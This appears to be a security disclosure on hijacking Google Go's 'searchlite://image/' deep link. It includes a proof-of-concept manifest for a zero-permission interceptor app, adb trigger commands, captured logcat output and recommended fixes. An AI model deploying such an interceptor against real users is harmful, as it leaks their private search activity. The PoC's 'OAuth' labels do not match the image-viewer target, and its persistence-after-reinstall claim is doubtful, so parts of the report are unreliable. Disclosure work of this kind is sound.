# Google Go (Search Lite) — Image Viewer Deep Link Interception via Unverified `searchlite://` Custom URI Scheme

## Summary

Google Go (`com.google.android.apps.searchlite`) registers a BROWSABLE intent filter for the custom URI scheme `searchlite://image/` on `SearchApiImageViewerActivity`, used to open an image URL (typically a private search-result thumbnail) in Google Go's in-app image viewer. A zero-permission attacker app can register a competing intent filter for the same scheme/host/path, causing Android to display a disambiguation chooser whenever `searchlite://image/` is invoked. If the user selects the attacker app once, the image URL (and any accompanying query parameters, such as the originating search query) is captured — and the interception persists silently on subsequent invocations without the chooser reappearing, since Android remembers the user's app-selection preference per intent-filter signature.

## Severity: HIGH

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: User must select the attacker app from the system chooser once; subsequent hijacks require **no further interaction**
- **CIA impact**: Confidentiality (private search-result image URLs and associated query context leaked to a zero-permission attacker); Integrity (the legitimate Google Go image viewer never opens once the attacker has been selected — silent, persistent redirection)

## Affected Components

- **Package**: `com.google.android.apps.searchlite` (Google Go / Search Lite)
- **Activity**: `com.google.android.apps.searchlite.search.imageviewer.SearchApiImageViewerActivity`
- **Scheme**: `searchlite://image/`

```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="searchlite" android:host="image" android:path="/" />
</intent-filter>
```

**No `android:autoVerify="true"` is present on this filter.** Because `searchlite://` is a custom scheme (not `https://`), Android App Link verification cannot apply.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

```xml
<activity android:name=".OAuthInterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="searchlite" android:host="image" />
    </intent-filter>
</activity>
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions.
2. Confirm the OS considers both apps as candidates (2-candidate resolution → chooser):
   ```
   $ adb shell pm resolve-activity -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
       -d "searchlite://image/?url=https://example.com/test.jpg"
   name=com.android.internal.app.ResolverActivity
   packageName=android
   ```
3. Trigger the deep link (as Google Go's search-results UI would, when the user taps an image thumbnail):
   ```
   adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE \
     -d "searchlite://image/?url=https://example.com/private_search_result.jpg"
   ```
4. Android displays the "Open with" chooser showing **ZeroPerm** alongside **Google Go**.
5. If the user selects ZeroPerm, the image URL is captured — and on every subsequent tap of a search-result image, Android silently routes straight to ZeroPerm without showing the chooser again, since the OS persists per-filter app selections.

### Runtime Proof

logcat after the deep link is delivered to the attacker app:

```
W OAUTH_INTERCEPT: === OAuth Scheme Interception PoC ===
W OAUTH_INTERCEPT: UID=10394 (ZERO permissions)
W OAUTH_INTERCEPT: [+] Data URI: searchlite://image/?url=https://example.com/private_search_result.jpg
W OAUTH_INTERCEPT: [+] Param: url = https://example.com/private_search_result.jpg
W OAUTH_INTERCEPT: === Zero-permission app intercepted OAuth callback ===
```

Foreground-activity confirmation of the persistent, no-prompt hijack (captured after uninstalling and reinstalling the PoC, i.e. a fresh app instance, yet still routed silently):

```
topResumedActivity=ActivityRecord{... com.vrp.zeroperm/.OAuthInterceptActivity ...}
```

## Impact

### Confidentiality
- **Private search context leakage**: The intercepted URL discloses the exact image the user viewed from Google Go's search results, which can reveal sensitive search context (e.g. medical, financial, or personal image searches) to a zero-permission attacker.
- **Behavioral profiling**: Every image the user opens from Google Go search results is silently routed through the attacker, providing a continuous feed of the user's search interests.

### Integrity
- **Persistent, silent redirection**: Unlike a one-off interception, Android's per-intent-filter default-app memory means that once the user makes a single (possibly accidental) chooser selection, the legitimate Google Go viewer is permanently bypassed for this deep link with no further chooser prompts and no visible indication to the user that their taps are being redirected to a different app.

## Attack Scenario

1. User searches for something sensitive in Google Go and taps an image thumbnail in the results.
2. Google Go dispatches `searchlite://image/?url=<result-image-url>` to open its in-app viewer.
3. The attacker's zero-permission app is already installed; the chooser appears once and the user selects/confirms it (or is socially engineered into doing so with a convincing app name/icon).
4. From that point forward, every image the user opens from Google Go search results is silently delivered to the attacker with zero further prompts, continuously leaking search-result URLs.

## Recommended Fix

1. Migrate `searchlite://image/` to a verified `https://` App Link with `autoVerify="true"`.
2. Validate the caller with `Activity.getCallingPackage()` before processing the intent, since this deep link is only ever meant to be self-dispatched by Google Go itself.
3. Remove the `BROWSABLE` category if this activity is not intended to be reachable from arbitrary external senders.

## Files Attached

- `poc.apk` — Zero-permission PoC app (v1.55)
- `screen_searchlite_data_capture.png` — ZeroPerm displaying captured `searchlite://image/` URL data
